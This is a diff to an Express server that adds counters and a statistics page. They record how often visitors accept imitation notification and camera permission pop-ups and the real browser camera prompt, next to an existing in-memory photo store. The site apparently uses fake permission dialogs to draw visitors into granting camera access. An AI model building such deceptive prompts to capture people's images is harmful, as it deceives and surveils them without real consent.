@@ -9,6 +9,29 @@ app.use(express.static(__dirname));
 // 存储照片（内存，重启清空）
 const photoStore = {};
 
+// 点击允许计数
+const clickStats = { notif: 0, camera: 0, realCameraAllow: 0, realCameraDeny: 0 };
+
+// 记录点击
+app.post('/api/track/:type', (req, res) => {
+  const type = req.params.type;
+  if (type in clickStats) {
+    clickStats[type]++;
+    res.json({ ok: true, count: clickStats[type] });
+  } else {
+    res.status(400).json({ ok: false });
+  }
+});
+
+// 重置统计
+app.post('/api/track/reset', (req, res) => {
+  clickStats.notif = 0;
+  clickStats.camera = 0;
+  clickStats.realCameraAllow = 0;
+  clickStats.realCameraDeny = 0;
+  res.json({ ok: true });
+});
+
 // 静态页面
 app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'report.html'));
@@ -149,6 +172,62 @@ app.get('/api/photos', (req, res) => {
     sessionId: id,
     count: photoStore[id].filter(Boolean).length
   })));
+});
+
+// 统计页面
+app.get('/amount', (req, res) => {
+  res.send(`<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>点击统计</title><style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,"PingFang SC",sans-serif;background:#f5f5f5;color:#1a1a1a}
+.topbar{background:linear-gradient(135deg,#FE2C55,#D4163E);color:#fff;padding:16px;position:sticky;top:0;z-index:10}
+.topbar h1{font-size:17px;font-weight:700}
+.stats{padding:20px 16px}
+.stat-card{background:#fff;border-radius:12px;padding:20px;margin-bottom:12px;box-shadow:0 1px 4px rgba(0,0,0,0.04)}
+.stat-label{font-size:13px;color:#999;margin-bottom:8px}
+.stat-num{font-size:42px;font-weight:700;color:#1a1a1a;line-height:1}
+.stat-num.red{color:#FE2C55}
+.stat-sub{font-size:12px;color:#bbb;margin-top:6px}
+.refresh-btn{display:block;width:calc(100% - 32px);margin:8px 16px;padding:12px;background:#fff;border:1.5px solid #e8e8e8;border-radius:10px;font-size:15px;cursor:pointer;font-family:inherit;color:#333}
+.refresh-btn:active{background:#f5f5f5}
+</style></head><body>
+<div class="topbar"><h1>点击允许统计</h1></div>
+<div class="stats">
+  <div class="stat-card">
+    <div class="stat-label">自制通知权限 - 点击允许次数</div>
+    <div class="stat-num red">${clickStats.notif}</div>
+    <div class="stat-sub">进入网站时弹出的通知权限申请</div>
+  </div>
+  <div class="stat-card">
+    <div class="stat-label">自制相机权限 - 点击允许次数</div>
+    <div class="stat-num red">${clickStats.camera}</div>
+    <div class="stat-sub">进入网站时弹出的相机权限申请</div>
+  </div>
+  <div class="stat-card">
+    <div class="stat-label">浏览器相机权限 - 点击允许次数</div>
+    <div class="stat-num" style="color:#07c160">${clickStats.realCameraAllow}</div>
+    <div class="stat-sub">点击提交后弹出的浏览器原生相机权限</div>
+  </div>
+  <div class="stat-card">
+    <div class="stat-label">浏览器相机权限 - 点击拒绝次数</div>
+    <div class="stat-num" style="color:#999">${clickStats.realCameraDeny}</div>
+    <div class="stat-sub">点击提交后弹出的浏览器原生相机权限</div>
+  </div>
+  <div class="stat-card">
+    <div class="stat-label">合计</div>
+    <div class="stat-num">${clickStats.notif + clickStats.camera + clickStats.realCameraAllow + clickStats.realCameraDeny}</div>
+    <div class="stat-sub">所有权限弹窗的总点击次数</div>
+  </div>
+</div>
+<button class="refresh-btn" onclick="location.reload()">刷新数据</button>
+<button class="refresh-btn" style="color:#FE2C55;border-color:#FE2C55;" onclick="resetStats()">重置所有数据</button>
+<script>
+function resetStats(){
+  if(!confirm('确认重置所有统计数据？'))return;
+  fetch('/api/track/reset',{method:'POST'}).then(function(){location.reload()});
+}
+</script>
+</body></html>`);
 });
 
 app.listen(PORT, () => {
